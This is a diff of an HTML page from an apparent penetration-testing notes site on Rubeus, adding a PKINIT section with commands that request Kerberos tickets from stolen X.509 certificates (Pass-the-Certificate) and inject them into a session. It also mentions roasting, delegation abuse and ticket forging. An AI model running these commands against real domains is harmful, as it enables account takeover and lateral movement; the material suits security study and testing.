@@ -38,10 +38,10 @@
             const path_to_root = "../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../searchindex-45f66119.js";
+            window.path_to_searchindex_js = "../searchindex-4f962408.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../toc-9a594cb9.js"></script>
+        <script src="../toc-22248eaf.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -192,6 +192,7 @@
 <li><strong>AS-REP Roasting</strong>: Extract hashes from accounts without pre-authentication</li>
 <li><strong>Constrained Delegation Abuse</strong>: S4U2Self and S4U2Proxy attacks</li>
 <li><strong>Ticket Forging</strong>: Create Golden and Silver tickets (with appropriate hashes)</li>
+<li><strong>PKINIT</strong>: Request TGTs using X.509 certificates (Pass-the-Certificate)</li>
 </ul>
 <hr>
 <h2 id="installation"><a class="header" href="#installation">Installation</a></h2>
@@ -221,6 +222,28 @@
 <h3 id="request-tgt-and-import-into-session"><a class="header" href="#request-tgt-and-import-into-session">Request TGT and Import into Session</a></h3>
 <pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
 </code></pre>
+<hr>
+<h2 id="pkinit-certificate-authentication"><a class="header" href="#pkinit-certificate-authentication">PKINIT (Certificate Authentication)</a></h2>
+<p>Request TGT using an X.509 certificate instead of a hash. Used in Pass-the-Certificate attacks after obtaining certificates from AD CS exploitation or Shadow Credentials attacks.</p>
+<h3 id="request-tgt-with-pfx-certificate"><a class="header" href="#request-tgt-with-pfx-certificate">Request TGT with PFX Certificate</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /certificate:C:\path\to\cert.pfx /password:PfxPassword123 /nowrap
+</code></pre>
+<h3 id="request-tgt-with-base64-certificate"><a class="header" href="#request-tgt-with-base64-certificate">Request TGT with Base64 Certificate</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /certificate:&lt;base64_pfx&gt; /password:&lt;pfx_password&gt; /ptt
+</code></pre>
+<h3 id="pkinit-options"><a class="header" href="#pkinit-options">PKINIT Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>/certificate:&lt;path_or_base64&gt;</code></td><td>Path to PFX file or Base64-encoded certificate</td></tr>
+<tr><td><code>/password:&lt;password&gt;</code></td><td>Password for the PFX file</td></tr>
+</tbody>
+</table>
+</div>
+<p><strong>Note:</strong> If PKINIT is not supported by the KDC, use tools like <code>gettgtpkinit.py</code> from PKINITtools or <code>PassTheCert</code> for LDAPS authentication.</p>
 <hr>
 <h2 id="pass-the-ticket-ptt"><a class="header" href="#pass-the-ticket-ptt">Pass the Ticket (PtT)</a></h2>
 <h3 id="import-kirbi-file"><a class="header" href="#import-kirbi-file">Import .kirbi File</a></h3>
